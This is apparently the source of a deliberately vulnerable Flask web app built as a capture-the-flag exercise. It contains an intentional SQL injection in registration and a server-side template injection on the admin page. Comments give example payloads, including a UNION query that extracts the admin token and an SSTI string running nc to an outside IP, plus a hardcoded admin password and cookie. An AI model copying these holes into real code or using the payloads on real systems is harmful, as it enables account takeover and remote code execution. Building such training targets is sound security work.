from flask import Flask, request, jsonify, make_response, render_template, render_template_string, abort, redirect, url_for, g
import sqlite3
import uuid
from wtforms import Form, StringField, PasswordField, validators
from flask import make_response
from datetime import datetime
import os, re


app = Flask(__name__)
app.config['TEMPLATES_AUTO_RELOAD'] = True
app.logger.setLevel("DEBUG")

def connect_to_database():
    return sqlite3.connect('mydb.db')

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = connect_to_database()
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

def initialisation():
    ## Admin account creation
    adminPass = "Sup3rFuck1n5Pa55w05d"
    adminSession = "bd65600d-8669-4903-8a14-af88203add38"
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute('''INSERT INTO users (username, password, session_token) VALUES (?,?,?)''', ('admin', adminPass, adminSession))

class RegisterForm(Form):
    username = StringField('Username', [
        validators.Length(min=4, max=100)
        ])
    password = PasswordField('Password', [
        validators.DataRequired(),
        validators.Length(min=8, max=100),
        validators.EqualTo('confirm', message='Passwords do not match')
    ])
    confirm = PasswordField('Confirm Password')

class LoginForm(Form):
    username = StringField('Username', [validators.Length(min=4, max=40)])
    password = PasswordField('Password', [validators.DataRequired()])

@app.route('/')
def home():
    session_token = request.cookies.get('session_token')
    if session_token:
        user = check_session(session_token)
        if user:
            return render_template('home.html',user=user)
    
    return render_template("home.html")
    

@app.route('/register', methods=['GET','POST'])
@app.route('/register.html', methods=['GET', 'POST'])
def register():
    form = RegisterForm(request.form)
    if request.method == 'POST' and form.validate():
        app.logger.debug('Form validated')
        username = form.username.data
        password = form.password.data
        # Verify username special char 
        # MARCHE PAS
        regex = re.compile('[_!#$%^&*()<>?/\|}{:]\'"')
        if regex.search(username) != None:
            return jsonify({'message': 'Special char forbiden!'}), 400

        #connect to the database
        conn = get_db()
        cursor = conn.cursor()
        app.logger.debug('connect db')
        if len(str(username)) >= 4 and len(str(username)) < 80 and len(str(password)) >= 8 and len(str(password)) < 40:
            #add the user to the database
            app.logger.debug('Try to add "%s" user',username)
            try:
                cursor.execute('''INSERT INTO users (username, password) VALUES (?,?)''', (username, password))
            except:
                return jsonify({'message': 'User already exists'}), 400
            conn.commit()
            app.logger.debug('User "%s" added successfuly !',username)
            
            #cursor.execute("SELECT username FROM users WHERE username=?",(username,))
            # Test avec la commande qui sort le session token admin
            #cursor.execute("SELECT username FROM users WHERE username=? AND 1=0 UNION SELECT session_token from users WHERE username='admin'",(username,))
            #mess=cursor.fetchone()
            #username=str(mess)
            
            ## VULNERABLE TO SQL Injection
            # test' AND 1=0 UNION SELECT session_token from users WHERE username='admin';--
            # ADMIN COOKIE : "bd65600d-8669-4903-8a14-af88203add38"
            cursor.execute("SELECT session_token FROM users WHERE username='" + username +"'")
            mess=cursor.fetchall()
            cookies=str(mess)
            # Mettre ça soit sur "home", soit sur "mon_compte"
            #return render_template("home.html",mess=mess)
            session_token = str(uuid.uuid4())
            cursor.execute('''UPDATE users SET session_token = ? WHERE username = ?''', (session_token, username))
            conn.commit()
            app.logger.debug("New token for user '%s' : '%s'",username,session_token)
            
            # NOT REALISTIC (Any idea?)
            if cookies == "[(None,)]":
                response = make_response(render_template('home.html',user=username,cookies=session_token))
            else:
                response = make_response(render_template('home.html',user=username,cookies=cookies))
            response.set_cookie('session_token', session_token)
            return response
    
    session_token = request.cookies.get('session_token')
    if check_session(session_token):
        return redirect(url_for('home'))
            
    return render_template('register.html', form=form)

@app.route('/mon_compte', methods=['GET'])
def account():
    session_token = request.cookies.get('session_token')
    if not check_session(session_token):
        abort(401) #return "Unauthorized", 401

    #connect to the database
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT username FROM users WHERE session_token=?",(session_token,))
    # Test avec la commande qui sort le session token admin
    #cursor.execute("SELECT username FROM users WHERE username=? AND 1=0 UNION SELECT session_token from users WHERE username='admin'",(username,))
    mess=cursor.fetchone()
    username=str(mess[0])

    cookies=session_token
    return render_template("home.html",user=username,cookies=cookies,mess=mess)

def check_password(username, password, cursor):
    app.logger.debug('Try connection with %s:%s',username,password)
    cursor.execute('''SELECT * FROM users WHERE username = ? AND password = ?''', (username, password))
    user = cursor.fetchone()
    app.logger.debug(user)
    if user is None:
        return False
    return True

@app.route('/login.html', methods=['GET','POST'])
@app.route('/login', methods=['GET','POST'])
def login():
    session_token = request.cookies.get('session_token')
    if check_session(session_token):
        return redirect(url_for('home'))

    form = LoginForm(request.form)
    if request.method == 'POST' and form.validate():
        username = form.username.data
        password = form.password.data
        #connect to the database
        conn = get_db()
        cursor = conn.cursor()
        #check if the user exists
        cursor.execute('''SELECT * FROM users WHERE username = ?''', (username,))
        user = cursor.fetchone()
        if user is None:
            return jsonify({"message": "Invalid username or password"}), 401
        #check the password
        # Si ça marche pas, try avec "hashed_password = hash_password(password)
        if not check_password(username, user[1], cursor):
            app.logger.debug('Invalid password')
            return jsonify({"message": "Invalid username or password"}), 401
        #login successful
        session_token = str(uuid.uuid4())
        cursor.execute('''UPDATE users SET session_token = "?" WHERE username = "?"''', (session_token, username))
        conn.commit()
        response = make_response(jsonify({"message": "Login successful"}), 200)
        response.set_cookie('session_token', session_token)
        return response
    return render_template('login.html', form=form)

def check_session(session_token):
    #connect to the database
    conn = get_db()
    cursor = conn.cursor()
    #check if the session token exists
    cursor.execute('''SELECT * FROM users WHERE session_token = ?''', (session_token,))
    user = cursor.fetchone()
    #return make_response(jsonify({"test": str(user)}), 200)

    try:
        app.logger.debug("session_token : "+session_token+" | return from db : "+str(user))
    except:
        pass
    if user is None:
        app.logger.debug('Access unauthorized - No session')
        return False
    elif user[0] == "admin":
        return "admin"
    return user[0]

@app.route('/admin.html')
@app.route('/admin')
def admin():
    session_token = request.cookies.get('session_token')

    now = datetime.now()
    date = now.strftime("%d/%m/%Y, %H:%M:%S")
    if session_token:
        user = check_session(session_token)
        if user != "admin":
            abort(401) #return "Unauthorized", 401

        cmd = request.args.get('cmd')
        bad_chars = "\"#&;[]|"
        if cmd and any(char in bad_chars for char in cmd) or cmd and len(cmd) > 135 :
            content = "<div style=\"text-align:center\">Wrong value for 'cmd'. </div><br><div style=\"text-align:center\">"+ date + "</div>"
        elif cmd == "date":
            content = "<div style=\"text-align:center\">"+ date + "</div>"
        elif cmd == "print":
            content = "<script>print()</script>"
        elif cmd == "photo" or cmd is None:
            content = """
<div style="text-align:center">
	<video autoplay="true" id="videoElement"></video>
</div>
<script>
var video = document.querySelector("#videoElement");
if (navigator.mediaDevices.getUserMedia) {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(function (stream) {
      video.srcObject = stream;
    })
    .catch(function (err0r) {
      console.log("Something went wrong!");
    });
}
</script>
"""
        else:
            ## VULNERABLE PART 2 - SSTI
            # {{cycler.__init__.__globals__.os.popen('nc 123.123.123.123').read()}}
            
            content = "<div style=\"text-align:center\">" + cmd + "</div>"

        return render_template("admin.html",user=user) + render_template_string(content)
        
    abort(401) 

@app.route('/contact.html')
@app.route('/contact')
def contact():
    session_token = request.cookies.get('session_token')
    if session_token:
        #connect to the database
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute("SELECT username FROM users WHERE session_token=?",(session_token,))
        # Test avec la commande qui sort le session token admin
        #cursor.execute("SELECT username FROM users WHERE username=? AND 1=0 UNION SELECT session_token from users WHERE username='admin'",(username,))
        mess=cursor.fetchone()
        username=str(mess[0])
        return render_template("contact.html",user=username)


    return render_template("contact.html")

@app.route('/image')
def genere_image():
    # Add random même
    return "Nothing for the moment."

@app.route('/401')
@app.route('/404')
@app.route('/500')
@app.errorhandler(401)
@app.errorhandler(404)
@app.errorhandler(500)
def ma_page_erreur(error):
    session_token = request.cookies.get('session_token')
    if session_token:
        user = check_session(session_token)
        return render_template("error.html",error=error,user=user)
    return render_template("error.html",error=error)
    #return "Ceci est une page d'erreur. Retournez manger du bambou ! Error logs : {}".format(error.code), error.code

if __name__ == '__main__':
    #with app.app_context():
    #    initialisation()
    app.run(debug=True, host='0.0.0.0', port=5000)


